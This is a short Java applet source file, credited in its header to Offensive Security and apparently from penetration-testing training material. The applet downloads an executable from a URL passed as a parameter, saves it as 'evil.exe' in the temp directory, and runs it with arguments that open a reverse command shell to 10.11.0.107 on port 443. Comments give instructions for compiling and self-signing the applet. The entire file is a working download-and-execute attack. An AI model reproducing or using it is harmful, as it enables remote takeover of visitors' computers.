import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
/**
 * Author: Offensive Security

 * This Java applet will download a file and execute it
 *Note: compile with/usr/lib/jvm/java-8-openjdk-i386/bin/javac -source 1.7 -target 1.7 -bootclasspath /usr/lib/jvm/java-8-openjdk-i386/jre/lib/rt.jar Java.java , and add manifest to header
 *Key sign: keytool -genkey -keyalg rsa -alias signapplet -keystore mykeystore -keypass <password> -storepass <sane password>

 **/
public class java_exploit extends Applet {
    private Object init = null;

    public Object isInitialized() {
        return init;
    }

    public void init() {
        Process f;
        try {
            String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
            String expath= tmpdir+ "evil.exe";
            String download="";
            download=getParameter("1");
            if(download.length()> 0){
                //URL Parameter
                URL url=new URL(download);
                //Get input for reading
                InputStream ins=url.openStream();
                BufferedInputStream bufins=new BufferedInputStream(ins);
                File outputFile=new File(expath);
                OutputStream os=new BufferedOutputStream(new FileOutputStream(outputFile));
                byte[] buffer= new byte[2048];
                for(;;){
                    int nBytes= bufins.read(buffer);
                    if (nBytes<=0) break;
                    os.write(buffer,0,nBytes);
                }
                os.flush();
                os.close();
                ins.close();
                f=Runtime.getRuntime().exec("cmd.exe /c "+expath + " 10.11.0.107 443 -e cmd.exe");
            }
        }catch (IOException e){
            e.printStackTrace();
        }
        catch (Exception exception){
            exception.printStackTrace();
        }
    }
}
